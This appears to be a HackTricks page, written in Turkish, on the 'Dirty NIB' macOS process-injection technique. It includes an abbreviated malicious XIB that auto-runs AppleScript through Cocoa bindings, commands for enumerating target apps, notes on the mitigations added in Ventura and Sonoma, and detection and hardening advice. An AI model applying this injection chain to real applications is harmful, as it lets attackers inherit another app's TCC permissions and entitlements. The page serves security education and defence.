# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB, imzalı bir macOS app bundle içindeki Interface Builder dosyalarının (.xib/.nib) kötüye kullanılarak hedef process içinde saldırgan kontrollü logic çalıştırılmasını ve böylece hedef process'in entitlements ve TCC permissions değerlerinin devralınmasını ifade eder. Bu technique ilk olarak xpn (MDSec) tarafından belgelenmiş, daha sonra Apple'ın macOS 13 Ventura ve macOS 14 Sonoma'daki mitigations uygulamalarını da ele alan Sector7 tarafından genelleştirilmiş ve önemli ölçüde genişletilmiştir.<sup>[[1]](#references)[[2]](#references)</sup> Arka plan ve ayrıntılı incelemeler için sondaki references bölümüne bakın.

> TL;DR
> • macOS 13 Ventura'dan önce: Bir bundle'ın MainMenu.nib dosyasını (veya startup sırasında yüklenen başka bir nib dosyasını) değiştirmek, process injection ve çoğu zaman privilege escalation elde edilmesini güvenilir şekilde sağlayabiliyordu.
> • macOS 13 (Ventura) ile birlikte ve macOS 14'te (Sonoma) iyileştirilerek: ilk launch deep verification, bundle protection, Launch Constraints ve yeni TCC “App Management” permission, ilgisiz app'ler tarafından launch sonrasında yapılan nib tampering işlemlerini büyük ölçüde engeller. Niche durumlarda (ör. kendi app'lerini değiştiren same-developer tooling veya kullanıcı tarafından App Management/Full Disk Access verilen terminaller) attacks hâlâ mümkün olabilir.


## What are NIB/XIB files

Nib (NeXT Interface Builder'ın kısaltması) dosyaları, AppKit app'leri tarafından kullanılan serialize edilmiş UI object graph'larıdır. Modern Xcode, düzenlenebilir XML .xib dosyalarını build sırasında .nib dosyalarına compile eder. Tipik bir app, ana UI'ını `NSApplicationMain()` aracılığıyla yükler; bu işlem app'in Info.plist dosyasındaki `NSMainNibFile` key'ini okur ve object graph'ı runtime sırasında instantiate eder.

Attack'i mümkün kılan temel noktalar:
- NIB loading, Objective-C class'larını NSSecureCoding'e conform olmalarını gerektirmeden arbitrary şekilde instantiate eder (Apple'ın nib loader'ı, `initWithCoder:` mevcut olmadığında `init`/`initWithFrame:` yöntemlerine fallback yapar).
- Cocoa Bindings, nib'ler instantiate edilirken method'ları çağırmak için kötüye kullanılabilir; buna user interaction gerektirmeyen chained call'lar da dahildir.


## Dirty NIB injection process (attacker view)

Klasik pre-Ventura flow:
1) Malicious bir .xib oluşturun
- Bir `NSAppleScript` object'i (veya `NSTask` gibi diğer “gadget” class'ları) ekleyin.
- Title'ı payload'ı (ör. AppleScript veya command arguments) içeren bir `NSTextField` ekleyin.
- Target object üzerindeki method'ları çağırmak için bindings aracılığıyla wired edilmiş bir veya daha fazla `NSMenuItem` object'i ekleyin.

2) User click olmadan auto-trigger
- Bir menu item'ın target/selector değerlerini ayarlamak için bindings kullanın ve ardından private `_corePerformAction` method'unu invoke edin; böylece action, nib load edildiğinde otomatik olarak fire eder. Bu, user'ın bir button'a click yapması ihtiyacını ortadan kaldırır.

Bir .xib içindeki auto-trigger chain'in minimal example'ı (anlaşılabilirlik için kısaltılmıştır):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Bu, nib yüklemesi sırasında hedef süreçte keyfi AppleScript yürütülmesini sağlar.<sup>[[1]](#references)</sup> Gelişmiş zincirler şunları yapabilir:
- Keyfi AppKit sınıflarını (ör. `NSTask`) örneklemek ve `-launch` gibi sıfır bağımsız değişkenli yöntemleri çağırmak.
- Yukarıdaki binding hilesi aracılığıyla nesne bağımsız değişkenleriyle keyfi selector'ları çağırmak.
- Objective-C'ye bridge etmek ve hatta seçili C API'lerini çağırmak için AppleScriptObjC.framework'ü yüklemek.
- Hâlâ Python.framework içeren eski sistemlerde Python'a bridge etmek ve ardından keyfi C işlevlerini çağırmak için `ctypes` kullanmak (Sector7 araştırması).<sup>[[2]](#references)</sup>

3) Uygulamanın nib dosyasını değiştirin
- target.app dosyasını yazılabilir bir konuma kopyalayın, örneğin `Contents/Resources/MainMenu.nib` dosyasını kötü amaçlı nib ile değiştirin ve target.app dosyasını çalıştırın. Ventura öncesinde, tek seferlik bir Gatekeeper değerlendirmesinden sonra sonraki başlatmalarda yalnızca yüzeysel imza kontrolleri gerçekleştiriliyordu; bu nedenle `.nib` gibi çalıştırılabilir olmayan kaynaklar yeniden doğrulanmıyordu.

Görünür bir test için örnek AppleScript payload'ı:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple, modern macOS'ta Dirty NIB'in uygulanabilirliğini büyük ölçüde azaltan çeşitli sistemik önlemler getirdi:<sup>[[2]](#references)</sup>
- İlk çalıştırmada derin doğrulama ve bundle koruması (macOS 13 Ventura)
- Herhangi bir app'in ilk çalıştırılmasında (quarantine uygulanmış olsun veya olmasın), derin bir signature check tüm bundle resources'larını kapsar. Bundan sonra bundle protected hale gelir: yalnızca aynı developer'a ait app'ler (veya app tarafından açıkça izin verilenler) içeriğini değiştirebilir. Diğer app'lerin başka bir app'in bundle'ına yazabilmesi için yeni TCC “App Management” permission'ı gerekir.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled app'ler başka bir yere kopyalanıp çalıştırılamaz; bu, OS app'leri için “copy to /tmp, patch, run” yaklaşımını etkisiz hale getirir.
- macOS 14 Sonoma'daki iyileştirmeler
- Apple, App Management'ı güçlendirdi ve Sector7 tarafından belirtilen bilinen bypass'ları (ör. CVE‑2023‑40450) düzeltti. Python.framework daha önce (macOS 12.3) kaldırılmıştı; bu da bazı privilege-escalation chain'lerini bozdu.
- Gatekeeper/Quarantine değişiklikleri
- Gatekeeper, provenance ve bu tekniği etkileyen assessment değişiklikleri hakkında daha geniş bir tartışma için aşağıda referans verilen sayfaya bakın.

> Practical implication
> • Ventura+ üzerinde process'inizde App Management yoksa veya target ile aynı Team ID tarafından imzalanmamışsa (ör. developer tooling), genellikle üçüncü taraf bir app'in .nib dosyasını değiştiremezsiniz.
> • Shell'lere/terminal'lere App Management veya Full Disk Access verilmesi, söz konusu terminal'in context'i içinde code execute edebilen her şey için bu attack surface'i fiilen yeniden açar.


### Addressing Launch Constraints

Launch Constraints, Ventura ile birlikte birçok Apple app'inin non-default location'lardan çalıştırılmasını engeller. Apple app'ini bir temp directory'ye kopyalama, `MainMenu.nib` dosyasını değiştirme ve app'i çalıştırma gibi Ventura öncesi workflow'lara güveniyorsanız, bunun >= 13.0 üzerinde başarısız olmasını bekleyin.


## Enumerating targets and nibs (useful for research / legacy systems)

- UI'sı nib-driven olan app'leri bulun:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Bir bundle içindeki aday nib kaynaklarını bulun:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Code signatures'larını derinlemesine doğrulayın (kaynakları kurcaladıysanız ve yeniden imzalamadıysanız başarısız olur):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Not: Modern macOS'ta uygun yetkilendirme olmadan başka bir uygulamanın bundle'ına yazmaya çalıştığınızda bundle protection/TCC tarafından da engellenirsiniz.


## Detection and DFIR ipuçları

- Bundle kaynaklarında file integrity monitoring
- Yüklü uygulamalardaki `Contents/Resources/*.nib` ve diğer executable olmayan kaynakların mtime/ctime değişikliklerini izleyin.
- Unified logs ve process behavior
- GUI uygulamaları içinde beklenmeyen AppleScript çalıştırılmasını ve AppleScriptObjC veya Python.framework yükleyen process'leri izleyin. Örnek:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Kaynakların bozulmadan kaldığından emin olmak için kritik uygulamalarda düzenli olarak `codesign --verify --deep` çalıştırın.
- Privilege context
- TCC kapsamında “App Management” veya Full Disk Access yetkisine sahip olan kişi ve process'leri denetleyin (özellikle terminaller ve management agent'ları). Bunları genel amaçlı shell'lerden kaldırmak, Dirty NIB tarzı tampering'in kolayca yeniden etkinleştirilmesini önler.


## Defensive hardening (developers and defenders)

- Programmatic UI kullanmayı tercih edin veya nib'lerden instantiate edilen öğeleri sınırlandırın. Güçlü class'ları (ör. `NSTask`) nib graph'larına dahil etmekten kaçının ve arbitrary object'ler üzerinde selector'ları dolaylı olarak çağıran binding'lerden kaçının.
- Library Validation ile hardened runtime'ı benimseyin (modern uygulamalarda zaten standarttır). Bu, tek başına nib injection'ı durdurmasa da kolay native code loading'i engeller ve saldırganları scripting-only payload'lara yönlendirir.
- Genel amaçlı araçlarda geniş App Management izinleri istemeyin veya bunlara bağlı kalmayın. MDM App Management gerektiriyorsa bu context'i user-driven shell'lerden ayırın.
- Uygulama bundle'ınızın integrity'sini düzenli olarak doğrulayın ve update mekanizmalarınızın bundle kaynaklarını self-heal etmesini sağlayın.


## HackTricks'te ilgili okumalar

Bu tekniği etkileyen Gatekeeper, quarantine ve provenance değişiklikleri hakkında daha fazla bilgi edinin:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (Pages örneğini içeren original write-up)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
